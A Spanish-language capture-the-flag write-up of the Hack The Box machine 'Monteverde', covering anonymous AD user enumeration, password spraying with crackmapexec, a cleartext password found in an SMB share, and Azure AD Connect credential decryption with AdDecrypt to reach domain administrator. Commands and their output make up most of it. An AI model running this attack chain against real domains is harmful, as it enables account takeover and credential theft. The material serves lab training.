---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - AD
  - SMB
  - PasswordSpraying
  - LDAP
  - AbuseAzureAdminsGroup
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#Active Directory Enumeration|Active Directory Enumeration]]
		- [[#Active Directory Enumeration#Users Validation|Users Validation]]
	- [[#Enumeration#Password Spraying|Password Spraying]]
		- [[#Password Spraying#Credential Validation|Credential Validation]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#SMB Share Enumeration|SMB Share Enumeration]]
	- [[#Exploitation#Password Spraying|Password Spraying]]
		- [[#Password Spraying#Credential Validation|Credential Validation]]
		- [[#Password Spraying#WinRM|WinRM]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#LDAP Enumeration|LDAP Enumeration]]
	- [[#Privilege Escalation#Abuse Azure Admins Group|Abuse Azure Admins Group]]
		- [[#Abuse Azure Admins Group#WinRM|WinRM]]

---
# Monteverde

![](Screenshots/Pasted%20image%2020260606093051.png)

>Máquina de Hack The Box llamada **[Monteverde](https://app.hackthebox.com/machines/Monteverde)**, centrada en la explotación de un entorno **Active Directory**.  
>La intrusión comienza mediante enumeración anónima de usuarios del dominio y un ataque de **password spraying** que permite obtener credenciales válidas.  
>Tras acceder al sistema mediante **WinRM**, se aprovecha una mala configuración relacionada con **Azure AD Connect**, recuperando credenciales administrativas y obteniendo acceso como **Administrator**.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.228.111
PING 10.129.228.111 (10.129.228.111) 56(84) bytes of data.
64 bytes from 10.129.228.111: icmp_seq=1 ttl=127 time=42.2 ms

--- 10.129.228.111 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.198/42.198/42.198/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.111 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49864/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696,49864 -sCV 10.129.228.111 -oN targeted
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-06 07:39:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49864/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-06T07:40:29
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

```PowerShell
crackmapexec smb 10.129.228.111
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.228.111 MEGABANK.LOCAL MONTEVERDE.MEGABANK.LOCAL`.
### Active Directory Enumeration

Se enumera los archivos compartidos.

```PowerShell
crackmapexec smb 10.129.228.111 --shares
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

crackmapexec smb 10.129.228.111 -u '' -p '' --shares
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111   445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED

crackmapexec smb 10.129.228.111 -u 'Guest' -p '' --shares
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest: STATUS_ACCOUNT_DISABLED

smbmap -H 10.129.228.111
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                               
[!] Access denied on 10.129.228.111, no fun for you...                                                                        
[*] Closed 1 connections

smbclient -L 10.129.228.111 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.111 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

No se consigue enumerar nada, se prueba con usuarios y dominios.

```PowerShell
rpcclient -U "" -N 10.129.228.111
rpcclient $> querydominfo
Domain:         MEGABANK
Server:
Comment:
Total Users:    51
Total Groups:   0
Total Aliases:  23
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

rpcclient $> querygroupmem 0x200
result was NT_STATUS_ACCESS_DENIED

rpcclient $> enumprinters
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
```

Se procesan los resultados para obtener listas limpias:

```powershell
cat users | awk -F'[][]' '{print $2}' | sponge users
cat groups | awk -F'[][]' '{print $2}' | sponge groups
```

Se comprueban los usuarios son válidos.
#### Users Validation

```PowerShell
kerbrute userenum --dc 10.129.228.111 -d MEGABANK.LOCAL users
2026/06/06 09:52:28 >  [+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       roleary@MEGABANK.LOCAL
2026/06/06 09:52:28 >  [+] VALID USERNAME:       mhope@MEGABANK.LOCAL
2026/06/06 09:52:28 >  Done! Tested 10 usernames (9 valid) in 0.049 seconds
```
### Password Spraying

Dado que se dispone de un listado de usuarios del dominio, se realiza una comprobación básica utilizando el nombre de usuario como contraseña. Esta técnica permite identificar credenciales débiles reutilizadas por cuentas de servicio.

```PowerShell
crackmapexec smb 10.129.228.111 -u users -p users
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Se obtiene las credenciales: `SABatchJobs:SABatchJobs`.
#### Credential Validation

```PowerShell
crackmapexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs'
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs

crackmapexec winrm 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs'
SMB         10.129.228.111   5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.129.228.111   5985   MONTEVERDE       [*] http://10.129.228.111:5985/wsman
WINRM       10.129.228.111   5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

---
## Exploitation
### SMB Share Enumeration

Con las credenciales obtenidas se enumeran los recursos SMB accesibles en busca de archivos de configuración, credenciales almacenadas o información sensible.

```PowerShell
crackmapexec smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111   445    MONTEVERDE       [+] Enumerated shares
SMB         10.129.228.111   445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111   445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111   445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111   445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111   445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111   445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111   445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111   445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111   445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111   445    MONTEVERDE       users$          READ
```

Se descargan todos los directorios.

```PowerShell
tree -fas
[       4096]  .
├── [       4096]  ./azure_uploads
├── [       4096]  ./NETLOGON
├── [       4096]  ./SYSVOL
│   └── [       4096]  ./SYSVOL/MEGABANK.LOCAL
│       ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/DfsrPrivate
│       ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies
│       │   ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
│       │   │   ├── [         22]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
│       │   │   ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
│       │   │   │   ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
│       │   │   │   │   └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
│       │   │   │   │       └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
│       │   │   │   │           └── [       1098]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
│       │   │   │   ├── [       2792]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
│       │   │   │   └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts
│       │   │   │       ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Shutdown
│       │   │   │       └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Scripts/Startup
│       │   │   └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER
│       │   └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
│       │       ├── [         22]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
│       │       ├── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
│       │       │   └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
│       │       │       └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
│       │       │           └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
│       │       │               └── [       4538]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
│       │       └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/USER
│       └── [       4096]  ./SYSVOL/MEGABANK.LOCAL/scripts
└── [       4096]  ./users
    ├── [       4096]  ./users/dgalanos
    ├── [       4096]  ./users/mhope
    │   └── [       1212]  ./users/mhope/azure.xml
    ├── [       4096]  ./users/roleary
    └── [       4096]  ./users/smorgan
```

Se visualiza el archivo: `azure.xml`.

```PowerShell
cat users/mhope/azure.xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>%
```

El archivo `azure.xml` contiene un objeto serializado de PowerShell relacionado con Azure AD. Entre sus propiedades aparece una contraseña almacenada en texto claro, lo que proporciona nuevas credenciales válidas dentro del dominio.

Se encuentra la contraseña: `4n0therD4y@n0th3r$`.
### Password Spraying

```PowerShell
crackmapexec smb 10.129.228.111 -u users -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111   445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
```

Se obtiene las credenciales: `mhope:4n0therD4y@n0th3r$`.
#### Credential Validation

```PowerShell
crackmapexec smb 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.129.228.111   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111   445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$

crackmapexec winrm 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.129.228.111   5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.129.228.111   5985   MONTEVERDE       [*] http://10.129.228.111:5985/wsman
WINRM       10.129.228.111   5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```
#### WinRM

```PowerShell
evil-winrm -i 10.129.10.232 -u 'mhope' -p '4n0therD4y@n0th3r$'
```

La flag de `usuario` se encuentra en: `C:\Users\mhope\Desktop`.

---
## Privilege Escalation
### LDAP Enumeration

```PowerShell
ldapdomaindump -u 'MEGABANK.LOCAL\mhope' -p '4n0therD4y@n0th3r$' 10.129.228.111
python3 -m http.server 80
```

![](Screenshots/Pasted%20image%2020260606112632.png)

Mediante la información obtenida por LDAP se observa que `mhope` pertenece al grupo `Azure Admins`, lo que sugiere una posible relación con la infraestructura de sincronización entre Active Directory y Azure AD.
### Abuse Azure Admins Group

Los miembros del grupo `Azure Admins` pueden acceder a información relacionada con Azure AD Connect. Esta solución almacena credenciales utilizadas para sincronizar identidades entre Active Directory y Azure AD. Mediante la herramienta `AdSyncDecrypt` es posible recuperar dichas credenciales y obtener acceso a una cuenta con privilegios elevados.

[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt).

Máquina atacante:

```PowerShell
wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
unzip AdDecrypt.zip
```

Máquina victima:

```PowerShell
cd C:\Windows\Temp
mkdir Privesc
cd Privesc
upload AdDecrypt.exe
upload mcrypt.dll
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
C:\Windows\Temp\Privesc\AdDecrypt.exe -FullSQL
======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

Se obtiene las credenciales: `administrator:d0m@in4dminyeah!`.
#### WinRM

```PowerShell
evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'
```

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---